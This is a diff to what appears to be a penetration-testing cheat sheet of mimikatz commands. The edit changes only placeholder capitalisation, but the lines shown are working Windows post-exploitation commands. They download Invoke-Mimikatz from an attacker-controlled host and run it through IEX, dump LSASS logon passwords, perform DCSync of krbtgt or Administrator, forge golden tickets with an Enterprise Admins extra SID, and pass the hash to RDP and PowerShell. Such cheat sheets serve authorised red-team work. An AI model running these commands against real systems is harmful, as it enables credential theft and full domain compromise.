@@ -11,7 +11,7 @@ mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsa
 ## powershell - load mimikatz
 https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX
+(new-object system.net.webclient).downloadstring('http://<LHOST>/Invoke-Mimikatz.ps1') | IEX
 Invoke mimikatz
 ```
 
@@ -24,7 +24,7 @@ mimikatz.exe 'privilege::debug' '!+' '!processprotect /process:lsass.exe /remove
 ## mimikatz dcsync - user (krbtgt/Administrator)
 #plateform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-mimikatz.exe 'privilege::debug' 'lsadump::dcsync /domain:<domain> /user:<user>' 'exit'
+mimikatz.exe 'privilege::debug' 'lsadump::dcsync /domain:<DOMAIN> /user:<USER>' 'exit'
 ```
 
 ## mimikatz extract credentials from dump
@@ -68,19 +68,19 @@ sid : origin domain sid : Get-DomainSID -Domain domainname
 sids :  ExtraSid value (Enterprise Admins SID) : parent SID
 	
 ```powershell
-kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
+kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
 ```
 
 % mimikatz, pth
 ## mimikatz pth to RDP mstsc.exe
 #plateform/windows  #target/local  #cat/PIVOT 
 ```
-sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:'mstsc.exe /restrictedadmin'
+sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<ntlm_hash> /run:'mstsc.exe /restrictedadmin'
 ```
 
 ## mimikatz pth run powershell remotelly
 #plateform/windows  #target/local  #cat/PIVOT 
 Followed by : Enter-PSSession -Computer {<}computer_name}
 ```
-sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
+sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<ntlm_hash> /run:powershell
 ```
